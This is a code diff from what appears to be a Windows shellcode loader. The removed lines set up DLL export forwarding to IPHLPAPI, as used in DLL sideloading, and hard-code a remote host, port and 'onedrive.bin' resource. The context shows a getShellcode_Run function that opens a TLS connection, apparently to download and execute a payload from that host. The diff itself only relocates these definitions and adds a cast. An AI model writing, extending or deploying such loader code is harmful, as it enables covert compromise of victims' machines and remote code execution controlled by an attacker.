@@ -352,30 +352,6 @@ EXTERN_C NTSTATUS NtWaitForSingleObject(
     IN PLARGE_INTEGER Timeout
 );
 
-#pragma once
-
-#include <ntdef.h> // For PUNICODE_STRING
-#include <winsock2.h>
-#include <ws2tcpip.h>
-#include <windows.h>
-#include <schannel.h>
-#include <security.h>
-#include <stdio.h>
-#include "ios"
-#include "fstream"
-
-// Linker export directive for AddIPAddress
-#pragma comment(linker, "/export:AddIPAddress=C:\\Windows\\System32\\IPHLPAPI.AddIPAddress,@1")
-
-#pragma comment(lib, "Ws2_32.lib")
-#pragma comment(lib, "Mswsock.lib")
-#pragma comment(lib, "AdvApi32.lib")
-#pragma comment(lib, "secur32.lib")
-
-char ip[] = "www.securitypps.com";
-char port[] = "443";
-char resource[] = "onedrive.bin";
-
 #define DEFAULT_BUFLEN 4096
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
 
@@ -501,7 +477,7 @@ void getShellcode_Run(char* host, char* port, char* resource) {
     schannelCred.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT;
 
     TimeStamp tsExpiry;
-    secStatus = AcquireCredentialsHandleA(NULL, UNISP_NAME_A, SECPKG_CRED_OUTBOUND, 
+    secStatus = AcquireCredentialsHandleA(NULL, (LPSTR)UNISP_NAME_A, SECPKG_CRED_OUTBOUND, 
                                           NULL, &schannelCred, NULL, NULL, &hCred, &tsExpiry);
     if (secStatus != SEC_E_OK) {
         DebugLog("AcquireCredentialsHandle failed: %x\n", secStatus);
